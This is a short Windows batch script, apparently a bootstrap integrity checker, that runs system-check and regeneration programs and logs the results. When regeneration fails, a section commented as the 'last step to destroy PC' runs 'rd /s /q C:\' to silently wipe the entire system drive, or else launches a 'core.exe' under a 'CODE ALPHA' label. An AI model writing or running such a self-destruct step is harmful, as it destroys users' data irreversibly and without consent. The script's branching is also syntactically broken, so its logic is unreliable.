@echo off
:: Warning compile core (this file)
set "isChecking=1"
if /%1 == / set "isChecking=0"
:: defines
set "CORE_PATH=C:\Bootstrap\core"

set "IDL_PATH=C:\Bootstrap\idl"

set "AUTORUNPATH=%AppData%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

set "CHECK_SYSTEMS=C:\Bootstrap\idl\CheckSYS.exe"

set "REGENERATE_SYSTEMS=C:\Bootstrap\idl\RegSYS.exe"

::check system
:check_systems
%CHECK_SYSTEMS% > chres.cr

if not exist chres.cr goto check_systems

set /p result=<chres.cr

del chres.cr

if "%result%" EQU 0 goto ok else goto fail

::ok
:ok
echo "[IDL] -> ok" >> C:\Bootstrap\idl\boot.txt
if %isChecking% == 0 goto start_core

::fail
:fail 
echo "[IDL] -> FAIL!!!, regenerate from restore." >> C:\Bootstrap\idl\boot.txt
%REGENERATE_SYSTEMS% > regres.rr
if not exist regres.rr goto fail 
set /p result=<regres.rr 
del regres.rr 
if "%result%" EQU 0 goto ok else goto end

::end last step to destroy PC
:end
if exist "%CORE_PATH%\core.exe" goto kill else rd /s /q C:\

::final can't return back
:kill
echo "[IDL] -> FATAL FAIL CORE EXIST STARTING CODE ALPHA!!!" >> C:\Bootstrap\idl\boot.txt
start "%CORE_PATH%\core.exe" *****a 

:start_core
start "%CORE_PATH%\core.exe"